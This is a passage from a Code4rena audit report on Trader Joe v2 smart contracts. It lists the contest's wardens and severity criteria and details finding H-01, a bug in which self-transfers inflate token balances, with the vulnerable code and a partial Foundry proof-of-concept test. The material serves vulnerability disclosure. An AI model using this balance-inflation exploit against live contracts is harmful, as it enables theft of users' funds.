{
  "circa": {
    "title": "Trader Joe v2 contest",
    "sponsor": "Trader Joe",
    "slug": "2022-10-traderjoe",
    "date": "2022-12-22",
    "findings": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues",
    "contest": 171
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Trader Joe v2 smart contract system written in Solidity. The audit contest took place between October 14—October 23 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>83 Wardens contributed reports to the Trader Joe v2 contest:</p>\n<ol>\n<li>0x1f8b</li>\n<li>0x4non</li>\n<li>0x52</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://twitter.com/8olidity\">8olidity</a></li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li><a href=\"https://twitter.com/BowTiedDravee\">Dravee</a></li>\n<li><a href=\"https://twitter.com/ElKu_crypto\">ElKu</a></li>\n<li>IllIllI</li>\n<li><a href=\"https://twitter.com/MukeshJ_eth\">JMukesh</a></li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li>Josiah</li>\n<li>KIntern_NA (TrungOre and duc)</li>\n<li>KingNFT</li>\n<li>Lambda</li>\n<li>LeoS</li>\n<li>M4TZ1P (<a href=\"https://twitter.com/huna38699\">DekaiHako</a>, holyhansss_kr, <a href=\"https://twitter.com/younsle1\">Zer0Luck</a>, AAIIWITF, and <a href=\"https://github.com/exd0tpy\">exd0tpy</a>)</li>\n<li>Mathieu</li>\n<li><a href=\"https://milotruck.github.io/\">MiloTruck</a></li>\n<li>Mukund</li>\n<li><a href=\"https://twitter.com/Nyksx__\">Nyx</a></li>\n<li><a href=\"https://www.linkedin.com/in/nhan-vo-a9473019a/\">Rahoz</a></li>\n<li><a href=\"https://twitter.com/randyyramadhan\">Randyyy</a></li>\n<li>RaoulSchaffranek</li>\n<li>ReyAdmirado</li>\n<li>Rolezn</li>\n<li>RustyRabbit</li>\n<li>SEVEN</li>\n<li>Saintcode_</li>\n<li>Shishigami</li>\n<li>SooYa</li>\n<li>The_GUILD (<a href=\"https://twitter.com/davidpius10\">David_</a>, <a href=\"https://twitter.com/iamephraim_js\">Ephraim</a>, LeoGold, and greatsamist)</li>\n<li><a href=\"https://mobile.twitter.com/tomj_bb\">TomJ</a></li>\n<li><a href=\"https://twitter.com/trust__90\">Trust</a></li>\n<li><a href=\"https://twitter.com/TuturuTech\">Tutturu</a></li>\n<li>__141345__</li>\n<li><a href=\"https://github.com/romeroadrian\">adriro</a></li>\n<li>bctester</li>\n<li>bitbopper</li>\n<li>brgltd</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li><a href=\"https://twitter.com/catchup22\">catchup</a></li>\n<li>cccz</li>\n<li>chaduke</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>d3e4</li>\n<li>djxploit</li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li>hxzy</li>\n<li><a href=\"https://twitter.com/0xhyh\">hyh</a></li>\n<li>imare</li>\n<li>immeas</li>\n<li><a href=\"https://twitter.com/krenkmet\">indijanc</a></li>\n<li>ladboy233</li>\n<li>leosathya</li>\n<li>lukris02</li>\n<li><a href=\"https://t.me/Road220\">m_Rassska</a></li>\n<li>ne0n</li>\n<li>neumo</li>\n<li><a href=\"https://twitter.com/ankitparashar\">parashar</a></li>\n<li>pashov</li>\n<li><a href=\"https://t.me/pfahard\">pfapostol</a></li>\n<li><a href=\"https://twitter.com/lovethewired\">phaze</a></li>\n<li><a href=\"https://twitter.com/real_philogy\">philogy</a></li>\n<li>rbserver</li>\n<li>rvierdiiev</li>\n<li>saian</li>\n<li>sha256yan</li>\n<li><a href=\"https://twitter.com/shunduquar\">shung</a></li>\n<li>sorrynotsorry</li>\n<li><a href=\"https://twitter.com/harshit16024263\">supernova</a></li>\n<li>vv7</li>\n<li>wagmi</li>\n<li>zzykxx</li>\n<li>zzzitron</li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/GalloDaSballo\">Alex the Entreprenerd</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 12 unique vulnerabilities. Of these vulnerabilities, 5 received a risk rating in the category of HIGH severity and 7 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 11 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 14 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-10-traderjoe\">C4 Trader Joe v2 contest repository</a>, and is composed of 26 smart contracts written in the Solidity programming language and includes 4,598 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"high-risk-findings-5\" style=\"position:relative;\"><a href=\"#high-risk-findings-5\" aria-label=\"high risk findings 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (5)</h1>\n<h2 id=\"h-01-transfering-funds-to-yourself-increases-your-balance\" style=\"position:relative;\"><a href=\"#h-01-transfering-funds-to-yourself-increases-your-balance\" aria-label=\"h 01 transfering funds to yourself increases your balance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299\">[H-01] Transfering funds to yourself increases your balance</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299\">Dravee</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/496\">bitbopper</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/441\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/422\">saian</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/391\">Tutturu</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/288\">JMukesh</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/284\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/266\">neumo</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/223\">parashar</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/221\">Randyyy</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/204\">phaze</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/128\">hxzy</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/107\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/48\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/46\">SEVEN</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/20\">ne0n</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/12\">8olidity</a>, and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/8\">RaoulSchaffranek</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182\">https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187\">https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192\">https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192</a><br></p>\n<p>Using temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that <code>_toBalance</code> can overwrite <code>_fromBalance</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">LBToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">176</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">177:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">178:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">179:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">180:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_fromBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_toBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">188</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_fromBalance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_balances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_toBalance</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit : if _from == _to : rekt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">..</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Furthermore, the <code>safeTransferFrom</code> function has the <code>checkApproval</code> modifier which passes without any limit if <code>_owner == _spender</code> :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">LBToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">checkApproval</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_spender</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">_isApprovedForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_spender</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LBToken__SpenderNotApproved</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_spender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">136:     ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">checkAddresses</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">checkApproval</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">269</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_isApprovedForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_spender</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">270</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_spender</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">_spenderApprovals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_spender</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">271</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Add the following test to <code>LBToken.t.sol</code> (run it with <code>forge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testSafeTransferFromOneself</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">, , , ) = </span><span class=\"mtk11\">addLiquidity</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ID_ONE</span><span class=\"mtk1\">, </span><span class=\"mtk7\">5</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initialBalance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">333333333333333333</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// using hardcoded value to ease understanding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">initialBalance</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//transfering to oneself</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rektBalance1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]); </span><span class=\"mtk3\">//computing new balance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span 